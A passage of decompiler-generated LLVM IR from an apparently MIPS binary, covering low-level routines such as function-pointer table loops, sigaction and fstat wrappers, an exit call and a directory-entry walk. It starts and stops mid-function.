  store i32 %tmp24, i32* %v1.global-to-local, align 4
  store i32 %tmp23, i32* %v0.global-to-local, align 4
  %v2_406b84 = icmp eq i32 %tmp24, %tmp23
  br i1 %v2_406b84, label %dec_label_pc_406bd0, label %dec_label_pc_406b8c

dec_label_pc_406b8c:                              ; preds = %dec_label_pc_406b74, %dec_label_pc_406b64, %dec_label_pc_406b20, %dec_label_pc_406aec
  %v0_406b8c = load i32, i32* %gp.global-to-local, align 4
  %v1_406b8c = add i32 %v0_406b8c, -32736
  %v2_406b8c = inttoptr i32 %v1_406b8c to i32*
  %v3_406b8c = load i32, i32* %v2_406b8c, align 4
  store i32 %v3_406b8c, i32* %v0.global-to-local, align 4
  %v1_406b94 = add i32 %v3_406b8c, 26772
  store i32 %v1_406b94, i32* %s1.global-to-local, align 4
  store i32 131072, i32* %a1.global-to-local, align 4
  store i32 131072, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_406b94)
  store i32 131074, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_406b94)
  store i32 131074, i32* %a1.global-to-local, align 4
  %v0_406bbc = load i32, i32* %s1.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_406bbc)
  store i32 %v2_4069b0, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_406bd0

dec_label_pc_406bd0:                              ; preds = %dec_label_pc_406b74, %dec_label_pc_406b58, %dec_label_pc_406b8c
  %v0_406bd0 = load i32, i32* %gp.global-to-local, align 4
  %v1_406bd0 = add i32 %v0_406bd0, -32708
  %v2_406bd0 = inttoptr i32 %v1_406bd0 to i32*
  %v3_406bd0 = load i32, i32* %v2_406bd0, align 4
  store i32 %v3_406bd0, i32* %v1.global-to-local, align 4
  %v3_406bd4 = load i32, i32* %v2_406bd0, align 4
  store i32 %v3_406bd4, i32* %v0.global-to-local, align 4
  %v0_406bd8 = load i32, i32* %s2.global-to-local, align 4
  %v1_406bd8 = inttoptr i32 %v0_406bd8 to i32*
  %v2_406bd8 = load i32, i32* %v1_406bd8, align 4
  %v2_406bdc = sub i32 %v3_406bd4, %v3_406bd0
  store i32 %v2_406bdc, i32* %v0.global-to-local, align 4
  %v1_406be0 = sdiv i32 %v2_406bdc, 4
  store i32 %v1_406be0, i32* %s1.global-to-local, align 4
  %v1_406be4 = add i32 %v0_406bd0, -32692
  %v2_406be4 = inttoptr i32 %v1_406be4 to i32*
  %v3_406be4 = load i32, i32* %v2_406be4, align 4
  store i32 %v3_406be4, i32* %v0.global-to-local, align 4
  store i32 %arg5, i32* %v1.global-to-local, align 4
  %v2_406bec = inttoptr i32 %v3_406be4 to i32*
  store i32 %v2_406bd8, i32* %v2_406bec, align 4
  %v0_406bf0 = load i32, i32* %gp.global-to-local, align 4
  %v1_406bf0 = add i32 %v0_406bf0, -32704
  %v2_406bf0 = inttoptr i32 %v1_406bf0 to i32*
  %v3_406bf0 = load i32, i32* %v2_406bf0, align 4
  store i32 %v3_406bf0, i32* %v0.global-to-local, align 4
  store i32 0, i32* %s0.global-to-local, align 4
  %v0_406bfc = load i32, i32* %v1.global-to-local, align 4
  %v2_406bfc = inttoptr i32 %v3_406bf0 to i32*
  store i32 %v0_406bfc, i32* %v2_406bfc, align 4
  %v0_406c00.pre = load i32, i32* %gp.global-to-local, align 4
  %v0_406c08.pre = load i32, i32* %v0.global-to-local, align 4
  %v1_406c14.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_406c00

dec_label_pc_406c00:                              ; preds = %dec_label_pc_406c00, %dec_label_pc_406bd0
  %v1_406c14 = phi i32 [ %v2_406c14, %dec_label_pc_406c00 ], [ %v1_406c14.pre, %dec_label_pc_406bd0 ]
  %v0_406c08 = phi i32 [ %v3_406c24, %dec_label_pc_406c00 ], [ %v0_406c08.pre, %dec_label_pc_406bd0 ]
  %v0_406c00 = phi i32 [ %v2_4069b0, %dec_label_pc_406c00 ], [ %v0_406c00.pre, %dec_label_pc_406bd0 ]
  %v1_406c00 = add i32 %v0_406c00, -32708
  %v2_406c00 = inttoptr i32 %v1_406c00 to i32*
  %v3_406c00 = load i32, i32* %v2_406c00, align 4
  store i32 %v3_406c00, i32* %v1.global-to-local, align 4
  %v2_406c08 = add i32 %v3_406c00, %v0_406c08
  store i32 %v2_406c08, i32* %v0.global-to-local, align 4
  %v1_406c0c = inttoptr i32 %v2_406c08 to i32*
  %v2_406c0c = load i32, i32* %v1_406c0c, align 4
  %v2_406c14 = add i32 %v1_406c14, 1
  store i32 %v2_406c14, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_406c0c)
  store i32 %v2_4069b0, i32* %gp.global-to-local, align 4
  %v1_406c20 = load i32, i32* %s1.global-to-local, align 4
  %v2_406c20 = icmp ult i32 %v2_406c14, %v1_406c20
  %v3_406c24 = mul i32 %v2_406c14, 4
  store i32 %v3_406c24, i32* %v0.global-to-local, align 4
  br i1 %v2_406c20, label %dec_label_pc_406c00, label %dec_label_pc_406c28

dec_label_pc_406c28:                              ; preds = %dec_label_pc_406c00
  %v0_406c2c = load i32, i32* %s3.global-to-local, align 4
  %v1_406c2c = icmp eq i32 %v0_406c2c, 0
  br i1 %v1_406c2c, label %dec_label_pc_406c44, label %dec_label_pc_406c30

dec_label_pc_406c30:                              ; preds = %dec_label_pc_406c28
  call void @__pseudo_call(i32 %v0_406c2c)
  store i32 %v2_4069b0, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_406c44

dec_label_pc_406c44:                              ; preds = %dec_label_pc_406c28, %dec_label_pc_406c30
  %v3_406c44 = load i32, i32* @global_var_44920c, align 4
  store i32 %v3_406c44, i32* %v1.global-to-local, align 4
  store i32 0, i32* %s0.global-to-local, align 4
  store i32 0, i32* %v0.global-to-local, align 4
  store i32 0, i32* %s1.global-to-local, align 4
  %v1_406c5c = add i32 %v1_4069b0, 272484
  %v2_406c5c = inttoptr i32 %v1_406c5c to i32*
  br label %dec_label_pc_406c5c

dec_label_pc_406c5c:                              ; preds = %dec_label_pc_406c5c, %dec_label_pc_406c44
  %v1_406c70 = phi i32 [ %v2_406c70, %dec_label_pc_406c5c ], [ 0, %dec_label_pc_406c44 ]
  %v0_406c64 = phi i32 [ %v3_406c80, %dec_label_pc_406c5c ], [ 0, %dec_label_pc_406c44 ]
  %v3_406c5c = load i32, i32* %v2_406c5c, align 4
  store i32 %v3_406c5c, i32* %v1.global-to-local, align 4
  %v2_406c64 = add i32 %v3_406c5c, %v0_406c64
  store i32 %v2_406c64, i32* %v0.global-to-local, align 4
  %v1_406c68 = inttoptr i32 %v2_406c64 to i32*
  %v2_406c68 = load i32, i32* %v1_406c68, align 4
  %v2_406c70 = add i32 %v1_406c70, 1
  store i32 %v2_406c70, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_406c68)
  store i32 %v2_4069b0, i32* %gp.global-to-local, align 4
  %v1_406c7c = load i32, i32* %s1.global-to-local, align 4
  %v2_406c7c = icmp ult i32 %v2_406c70, %v1_406c7c
  %v3_406c80 = mul i32 %v2_406c70, 4
  store i32 %v3_406c80, i32* %v0.global-to-local, align 4
  br i1 %v2_406c7c, label %dec_label_pc_406c5c, label %dec_label_pc_406c84

dec_label_pc_406c84:                              ; preds = %dec_label_pc_406c5c
  %v3_406c88 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_406c88, i32* %v0.global-to-local, align 4
  %v1_406c90 = icmp eq i32 %v3_406c88, 0
  br i1 %v1_406c90, label %dec_label_pc_406cb0, label %dec_label_pc_406c94

dec_label_pc_406c94:                              ; preds = %dec_label_pc_406c84
  store i32 %v3_406c88, i32* @t9, align 4
  %v1_406ca0 = call i32 @function_4055d0()
  store i32 %v1_406ca0, i32* %v0.global-to-local, align 4
  store i32 %v2_4069b0, i32* %gp.global-to-local, align 4
  %v1_406cac = inttoptr i32 %v1_406ca0 to i32*
  store i32 0, i32* %v1_406cac, align 4
  br label %dec_label_pc_406cb0

dec_label_pc_406cb0:                              ; preds = %dec_label_pc_406c84, %dec_label_pc_406c94
  %v3_406cb0 = load i32, i32* @global_var_449328.392, align 4
  store i32 %v3_406cb0, i32* %v0.global-to-local, align 4
  %v1_406cb8 = icmp eq i32 %v3_406cb0, 0
  br i1 %v1_406cb8, label %dec_label_pc_406cd8, label %dec_label_pc_406cbc

dec_label_pc_406cbc:                              ; preds = %dec_label_pc_406cb0
  %v1_406cc8 = call i32 @unknown_0()
  store i32 %v1_406cc8, i32* %v0.global-to-local, align 4
  store i32 %v2_4069b0, i32* %gp.global-to-local, align 4
  %v1_406cd4 = inttoptr i32 %v1_406cc8 to i32*
  store i32 0, i32* %v1_406cd4, align 4
  br label %dec_label_pc_406cd8

dec_label_pc_406cd8:                              ; preds = %dec_label_pc_406cb0, %dec_label_pc_406cbc
  %v0_406cd8 = load i32, i32* %gp.global-to-local, align 4
  %v1_406cd8 = add i32 %v0_406cd8, -32164
  %v2_406cd8 = inttoptr i32 %v1_406cd8 to i32*
  %v3_406cd8 = load i32, i32* %v2_406cd8, align 4
  store i32 %v3_406cd8, i32* @v0, align 4
  %v1_406ce0 = inttoptr i32 %v3_406cd8 to i32*
  %v2_406ce0 = load i32, i32* %v1_406ce0, align 4
  store i32 %v2_406ce0, i32* %a2.global-to-local, align 4
  %v0_406ce4 = load i32, i32* %s5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_406cf0.393 to i32), i32* @ra, align 4
  %v1_406ce8 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_406ce8, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_406ce4)
  store i32 %v2_4069b0, i32* %gp.global-to-local, align 4
  %v3_406cf8 = load i32, i32* @global_var_449220.394, align 4
  store i32 %v3_406cf8, i32* @t9, align 4
  %v1_406d00 = load i32, i32* @v0, align 4
  %v3_406d00 = call i32 @function_406490(i32 %v1_406d00)
  store i32 %v3_406d00, i32* %v0.global-to-local, align 4
  ret i32 %v3_406d00

; uselistorder directives
  uselistorder i32 %v2_406c70, { 2, 0, 3, 1 }
  uselistorder i32 %v2_406c14, { 2, 0, 3, 1 }
  uselistorder i32 %v4_406a90, { 1, 0 }
  uselistorder i32 %v1_406a84, { 1, 2, 0 }
  uselistorder i32 %v0_406a74, { 0, 2, 1 }
  uselistorder i32 %v3_406a50, { 0, 1, 3, 2 }
  uselistorder i32 %v0_406a44, { 2, 1, 0 }
  uselistorder i32 %v2_406a24, { 1, 0, 2 }
  uselistorder i32 %v2_4069b0, { 6, 5, 4, 7, 3, 8, 0, 2, 9, 10, 11, 12, 13, 14, 1, 15, 16 }
  uselistorder i32 %tmp27, { 0, 2, 1 }
  uselistorder i32 %tmp26, { 0, 4, 3, 2, 1 }
  uselistorder i32 %tmp25, { 1, 0 }
  uselistorder i32 %tmp24, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 2, 1, 17, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 20, 22, 21, 23, 25, 24, 29, 26, 27, 28, 30, 31 }
  uselistorder i32* %s1.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8 }
  uselistorder i32* %gp.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 15, 12, 13, 7, 14, 8, 9, 10, 11, 16, 17, 18, 19, 20 }
  uselistorder i32* %a2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %a1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i32)* @function_406490, { 2, 1, 0 }
  uselistorder i32 4096, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 15, { 4, 0, 2, 5, 1, 6, 3, 7 }
  uselistorder i32* @global_var_449580.243, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_406cd8, { 1, 0 }
  uselistorder label %dec_label_pc_406cb0, { 1, 0 }
  uselistorder label %dec_label_pc_406c44, { 1, 0 }
  uselistorder label %dec_label_pc_406bd0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_406ad4, { 1, 0 }
  uselistorder label %dec_label_pc_406a84, { 1, 0 }
  uselistorder label %dec_label_pc_406a20, { 1, 0 }
}

define i32 @function_406d10(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406d10:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %tmp8 = alloca i32, align 4
  store i32 %tmp, i32* %s0.global-to-local, align 4
  store i32 %arg3, i32* %s1.global-to-local, align 4
  store i32 %arg1, i32* %s2.global-to-local, align 4
  %v1_406d4c = icmp eq i32* %arg2, null
  br i1 %v1_406d4c, label %dec_label_pc_406d7c, label %dec_label_pc_406d50

dec_label_pc_406d50:                              ; preds = %dec_label_pc_406d10
  call void @__pseudo_call(i32 ptrtoint (i32* @global_var_407830.379 to i32))
  %v0_406d60 = load i32, i32* %s0.global-to-local, align 4
  %v1_406d60 = add i32 %v0_406d60, 136
  %v2_406d60 = inttoptr i32 %v1_406d60 to i32*
  %v3_406d60 = load i32, i32* %v2_406d60, align 4
  store i32 %v3_406d60, i32* @v1, align 4
  %v1_406d64 = inttoptr i32 %v0_406d60 to i32*
  %v2_406d64 = load i32, i32* %v1_406d64, align 4
  store i32 %v2_406d64, i32* @v0, align 4
  %v0_406d90.pre = load i32, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_406d7c

dec_label_pc_406d7c:                              ; preds = %dec_label_pc_406d10, %dec_label_pc_406d50
  %v0_406d90 = phi i32 [ %arg1, %dec_label_pc_406d10 ], [ %v0_406d90.pre, %dec_label_pc_406d50 ]
  %v3_406d8c = load i32, i32* @global_var_449350.396, align 4
  store i32 %v0_406d90, i32* @a0, align 4
  call void @__pseudo_call(i32 %v3_406d8c)
  %v0_406da0 = load i32, i32* %s1.global-to-local, align 4
  %v1_406da0 = icmp eq i32 %v0_406da0, 0
  %v2_406da0 = load i32, i32* @v0, align 4
  store i32 %v2_406da0, i32* %s0.global-to-local, align 4
  br i1 %v1_406da0, label %dec_label_pc_406ddc, label %dec_label_pc_406da4

dec_label_pc_406da4:                              ; preds = %dec_label_pc_406d7c
  %v1_406dac = add i32 %v0_406da0, 8
  store i32 %v1_406dac, i32* @a0, align 4
  %v1_406db4 = icmp slt i32 %v2_406da0, 0
  br i1 %v1_406db4, label %dec_label_pc_406ddc, label %dec_label_pc_406db8

dec_label_pc_406db8:                              ; preds = %dec_label_pc_406da4
  call void @__pseudo_call(i32 ptrtoint (i32* @global_var_407830.379 to i32))
  %v3_406dcc = load i32, i32* %tmp8, align 4
  %v1_406dd4 = load i32, i32* %s1.global-to-local, align 4
  %v2_406dd4 = inttoptr i32 %v1_406dd4 to i32*
  store i32 %v3_406dcc, i32* %v2_406dd4, align 4
  %v0_406dd8 = load i32, i32* @v1, align 4
  %v1_406dd8 = load i32, i32* %s1.global-to-local, align 4
  %v2_406dd8 = add i32 %v1_406dd8, 136
  %v3_406dd8 = inttoptr i32 %v2_406dd8 to i32*
  store i32 %v0_406dd8, i32* %v3_406dd8, align 4
  %v0_406ddc.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_406ddc

dec_label_pc_406ddc:                              ; preds = %dec_label_pc_406da4, %dec_label_pc_406d7c, %dec_label_pc_406db8
  %v0_406ddc = phi i32 [ %v2_406da0, %dec_label_pc_406da4 ], [ %v2_406da0, %dec_label_pc_406d7c ], [ %v0_406ddc.pre, %dec_label_pc_406db8 ]
  ret i32 %v0_406ddc

; uselistorder directives
  uselistorder label %dec_label_pc_406ddc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_406d7c, { 1, 0 }
}

define i32 @function_406e00(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_406e00:
  %s0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %sigaction*
  %v7_406e20 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp)
  %v3_406e24 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_406e24, i32* @t9, align 4
  %v1_406e28 = icmp eq i32 %arg4, 0
  store i32 %v7_406e20, i32* %s0.global-to-local, align 4
  br i1 %v1_406e28, label %dec_label_pc_406e44, label %dec_label_pc_406e2c

dec_label_pc_406e2c:                              ; preds = %dec_label_pc_406e00
  %v1_406e30 = call i32 @function_4055d0()
  %v0_406e3c = load i32, i32* %s0.global-to-local, align 4
  %v2_406e3c = inttoptr i32 %v1_406e30 to i32*
  store i32 %v0_406e3c, i32* %v2_406e3c, align 4
  br label %dec_label_pc_406e44

dec_label_pc_406e44:                              ; preds = %dec_label_pc_406e00, %dec_label_pc_406e2c
  %v4_406e4c = phi i32 [ %v7_406e20, %dec_label_pc_406e00 ], [ -1, %dec_label_pc_406e2c ]
  ret i32 %v4_406e4c

; uselistorder directives
  uselistorder label %dec_label_pc_406e44, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_406e60(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_406e60:
  store i32 %arg1, i32* @s1, align 4
  call void @exit(i32 %arg1)
  unreachable

; uselistorder directives
  uselistorder i32* @s1, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
}

define i32 @function_406eb0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406eb0:
  %s0.global-to-local = alloca i32, align 4
  %tmp4 = alloca i32, align 4
  %tmp5 = bitcast i32* %tmp4 to %stat*
  %v4_406ee0 = call i32 @fstat(i32 %arg1, %stat* %tmp5)
  %v3_406ee4 = load i32, i32* @global_var_4492e0.262, align 4
  %v0_406ee8 = load i32, i32* @a3, align 4
  %v1_406ee8 = icmp eq i32 %v0_406ee8, 0
  store i32 %v4_406ee0, i32* %s0.global-to-local, align 4
  br i1 %v1_406ee8, label %dec_label_pc_406f08, label %dec_label_pc_406eec

dec_label_pc_406eec:                              ; preds = %dec_label_pc_406eb0
  call void @__pseudo_call(i32 %v3_406ee4)
  %v0_406efc = load i32, i32* %s0.global-to-local, align 4
  %v2_406efc = inttoptr i32 %v4_406ee0 to i32*
  store i32 %v0_406efc, i32* %v2_406efc, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_406f08

dec_label_pc_406f08:                              ; preds = %dec_label_pc_406eb0, %dec_label_pc_406eec
  %v0_406f242 = phi i32 [ %v4_406ee0, %dec_label_pc_406eb0 ], [ -1, %dec_label_pc_406eec ]
  %v1_406f10 = icmp eq i32 %v4_406ee0, 0
  br i1 %v1_406f10, label %dec_label_pc_406f14, label %dec_label_pc_406f24

dec_label_pc_406f14:                              ; preds = %dec_label_pc_406f08
  %v3_406f08 = load i32, i32* @global_var_44934c.400, align 4
  call void @__pseudo_call(i32 %v3_406f08)
  %v0_406f24.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_406f24

dec_label_pc_406f24:                              ; preds = %dec_label_pc_406f08, %dec_label_pc_406f14
  %v0_406f24 = phi i32 [ %v0_406f242, %dec_label_pc_406f08 ], [ %v0_406f24.pre, %dec_label_pc_406f14 ]
  ret i32 %v0_406f24

; uselistorder directives
  uselistorder i32 %v4_406ee0, { 1, 0, 3, 2 }
  uselistorder i32* %s0.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_406f24, { 1, 0 }
  uselistorder label %dec_label_pc_406f08, { 1, 0 }
}

define i32 @function_406f40(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406f40:
  %a2.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @a1, align 4
  %v0_406f50 = load i32, i32* @ra, align 4
  %v3_406f64 = load i32, i32* @global_var_4492c0.402, align 4
  store i32 %v3_406f64, i32* @t9, align 4
  store i32 %arg1, i32* @s0, align 4
  %v2_406f6c = call i32 @function_407000()
  store i32 %v2_406f6c, i32* %v0.global-to-local, align 4
  %v1_406f78 = icmp slt i32 %v2_406f6c, 1
  store i32 %v2_406f6c, i32* %s1.global-to-local, align 4
  br i1 %v1_406f78, label %dec_label_pc_406fe4, label %dec_label_pc_406f7c

dec_label_pc_406f7c:                              ; preds = %dec_label_pc_406f40
  %v0_406f84 = load i32, i32* @s0, align 4
  %v2_406f84 = add i32 %v0_406f84, %v2_406f6c
  store i32 %v2_406f84, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_406f88

dec_label_pc_406f88:                              ; preds = %dec_label_pc_406f88, %dec_label_pc_406f7c
  %v1_406f98 = phi i32 [ %v2_406fcc, %dec_label_pc_406f88 ], [ %v0_406f84, %dec_label_pc_406f7c ]
  %v1_406f88 = add i32 %v1_406f98, 16
  %v2_406f88 = inttoptr i32 %v1_406f88 to i16*
  %v3_406f88 = load i16, i16* %v2_406f88, align 2
  %v4_406f88 = zext i16 %v3_406f88 to i32
  store i32 %v4_406f88, i32* %v0.global-to-local, align 4
  %v1_406f8c = add i32 %v1_406f98, 8
  %v2_406f8c = inttoptr i32 %v1_406f8c to i32*
  %v3_406f8c = load i32, i32* %v2_406f8c, align 4
  %v1_406f90 = add i32 %v1_406f98, 18
  %v2_406f90 = inttoptr i32 %v1_406f90 to i8*
  %v3_406f90 = load i8, i8* %v2_406f90, align 1
  %v4_406f90 = zext i8 %v3_406f90 to i32
  store i32 %v4_406f90, i32* @a3, align 4
  store i32 %v4_406f88, i32* %a2.global-to-local, align 4
  %v2_406f98 = add i32 %v1_406f98, 4
  %v3_406f98 = inttoptr i32 %v2_406f98 to i32*
  store i32 %v3_406f8c, i32* %v3_406f98, align 4
  %v0_406f9c = load i32, i32* @a3, align 4
  %v1_406f9c = trunc i32 %v0_406f9c to i8
  %v2_406f9c = load i32, i32* @s0, align 4
  %v3_406f9c = add i32 %v2_406f9c, 10
  %v4_406f9c = inttoptr i32 %v3_406f9c to i8*
  store i8 %v1_406f9c, i8* %v4_406f9c, align 1
  %v0_406fa0 = load i32, i32* %v0.global-to-local, align 4
  %v1_406fa0 = trunc i32 %v0_406fa0 to i16
  %v2_406fa0 = load i32, i32* @s0, align 4
  %v3_406fa0 = add i32 %v2_406fa0, 8
  %v4_406fa0 = inttoptr i32 %v3_406fa0 to i16*
  store i16 %v1_406fa0, i16* %v4_406fa0, align 2
  %v0_406fa4 = load i32, i32* @t9, align 4
  %v1_406fa4 = load i32, i32* %a2.global-to-local, align 4
  %v2_406fa4 = add i32 %v1_406fa4, -19
  store i32 %v2_406fa4, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_406fa4)
  %v0_406fb0 = load i32, i32* @s0, align 4
  %v1_406fb0 = add i32 %v0_406fb0, 8
  %v2_406fb0 = inttoptr i32 %v1_406fb0 to i16*
  %v3_406fb0 = load i16, i16* %v2_406fb0, align 2
  %v4_406fb0 = zext i16 %v3_406fb0 to i32
  store i32 %v4_406fb0, i32* %a2.global-to-local, align 4
  %v3_406fb4 = load i32, i32* @global_var_4493b0.404, align 4
  store i32 %v3_406fb4, i32* @t9, align 4
  %v5_406fbc = call i32 @function_407970(i32 %v0_406fb0, i32 %v0_406fb0, i32 %v4_406fb0)
  store i32 %v5_406fbc, i32* %v0.global-to-local, align 4
  %v0_406fc4 = load i32, i32* @s0, align 4
  %v1_406fc4 = add i32 %v0_406fc4, 8
  %v2_406fc4 = inttoptr i32 %v1_406fc4 to i16*
  %v3_406fc4 = load i16, i16* %v2_406fc4, align 2
  %v4_406fc4 = zext i16 %v3_406fc4 to i32
  %v2_406fcc = add i32 %v4_406fc4, %v0_406fc4
  store i32 %v2_406fcc, i32* @s0, align 4
  %v1_406fd0 = load i32, i32* %s2.global-to-local, align 4
  %v2_406fd0 = icmp ult i32 %v2_406fcc, %v1_406fd0
  %v3_406fd0 = zext i1 %v2_406fd0 to i32
  store i32 %v3_406fd0, i32* %v0.global-to-local, align 4
  %v3_406fd4 = load i32, i32* @global_var_4493b0.404, align 4
  store i32 %v3_406fd4, i32* @t9, align 4
  br i1 %v2_406fd0, label %dec_label_pc_406f88, label %dec_label_pc_406fe4.loopexit

dec_label_pc_406fe4.loopexit:                     ; preds = %dec_label_pc_406f88
  %v0_406fe4.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_406fe4

dec_label_pc_406fe4:                              ; preds = %dec_label_pc_406fe4.loopexit, %dec_label_pc_406f40
  %v0_406fe4 = phi i32 [ %v0_406fe4.pre, %dec_label_pc_406fe4.loopexit ], [ %v2_406f6c, %dec_label_pc_406f40 ]
  store i32 %v0_406fe4, i32* %v0.global-to-local, align 4
  store i32 %v0_406f50, i32* @ra, align 4
  ret i32 %v0_406fe4

; uselistorder directives
  uselistorder i32 %v0_406fe4, { 1, 0 }
  uselistorder i32 %v2_406fcc, { 1, 2, 0 }
  uselistorder i32 %v0_406fb0, { 1, 0, 2 }
  uselistorder i32 %v1_406f98, { 0, 1, 3, 2 }
  uselistorder i32 %v0_406f84, { 1, 0 }
  uselistorder i32 %v2_406f6c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 4, 2, 3, 5 }
}

define i32 @function_407000() local_unnamed_addr {
dec_label_pc_407000:
  %a2.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %s6.global-to-local = alloca i32, align 4
  %s7.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v1_407008 = load i32, i32* @t9, align 4
  %v2_407008 = add i32 %v1_407008, 303568
  store i32 %v2_407008, i32* %gp.global-to-local, align 4
  %v2_40700c = ptrtoint i32* %stack_var_-72 to i32
  %v0_407040 = load i32, i32* @a2, align 4
  %v1_407040 = add i32 %v0_407040, 14
  %v1_407044 = and i32 %v1_407040, -8
  %v2_40704c = sub i32 %v2_40700c, %v1_407044
  %v1_407050 = add i32 %v2_40704c, 24
  store i32 %v1_407050, i32* %s3.global-to-local, align 4
  %v0_407054 = load i32, i32* @a1, align 4
  store i32 %v0_407054, i32* %s4.global-to-local, align 4
  store i32 %v0_407040, i32* %s5.global-to-local, align 4
  store i32 4219, i32* %v0.global-to-local, align 4
  %v0_40706c = load i32, i32* @a3, align 4
  %v1_40706c = icmp eq i32 %v0_40706c, 0
  store i32 4219, i32* %s2.global-to-local, align 4
  br i1 %v1_40706c, label %dec_label_pc_407090, label %dec_label_pc_407098

dec_label_pc_407090:                              ; preds = %dec_label_pc_407000
  store i32 -1, i32* %v0.global-to-local, align 4
  store i32 %v0_407054, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_4070a4

dec_label_pc_407098:                              ; preds = %dec_label_pc_407000
  %v3_407074 = load i32, i32* @global_var_4492e0.262, align 4
  store i32 %v3_407074, i32* @t9, align 4
  %v1_40707c = call i32 @function_4055d0()
  store i32 %v2_407008, i32* %gp.global-to-local, align 4
  %v0_407088 = load i32, i32* %s2.global-to-local, align 4
  %v2_407088 = inttoptr i32 %v1_40707c to i32*
  store i32 %v0_407088, i32* %v2_407088, align 4
  store i32 -1, i32* %s2.global-to-local, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v3_4070942 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v3_4070942, i32* %s1.global-to-local, align 4
  %v0_4070a4.pre = load i32, i32* %s3.global-to-local, align 4
  %v0_4070c8.pre.pre = load i32, i32* @a3, align 4
  br label %dec_label_pc_4070a4

dec_label_pc_4070a4:                              ; preds = %dec_label_pc_407090, %dec_label_pc_407098
  %v0_4070c8.pre = phi i32 [ 0, %dec_label_pc_407090 ], [ %v0_4070c8.pre.pre, %dec_label_pc_407098 ]
  %v0_4070c46 = phi i32 [ %v0_407054, %dec_label_pc_407090 ], [ %v3_4070942, %dec_label_pc_407098 ]
  %v0_4070a4 = phi i32 [ %v1_407050, %dec_label_pc_407090 ], [ %v0_4070a4.pre, %dec_label_pc_407098 ]
  store i32 %v0_4070a4, i32* %s0.global-to-local, align 4
  store i32 -1, i32* %s6.global-to-local, align 4
  store i32 -1, i32* %s7.global-to-local, align 4
  br label %dec_label_pc_4070b4

dec_label_pc_4070b4:                              ; preds = %dec_label_pc_40711c, %dec_label_pc_4070a4
  %v0_4070c8 = phi i32 [ %v4_407184, %dec_label_pc_40711c ], [ %v0_4070c8.pre, %dec_label_pc_4070a4 ]
  %v0_4070c4 = phi i32 [ %v0_40717c, %dec_label_pc_40711c ], [ %v0_4070c46, %dec_label_pc_4070a4 ]
  %v0_4070b4 = phi i32 [ %v2_40716c, %dec_label_pc_40711c ], [ %v0_4070a4, %dec_label_pc_4070a4 ]
  %v1_4070b4 = add i32 %v0_4070b4, 16
  %v2_4070b4 = inttoptr i32 %v1_4070b4 to i16*
  %v3_4070b4 = load i16, i16* %v2_4070b4, align 2
  %v4_4070b4 = zext i16 %v3_4070b4 to i32
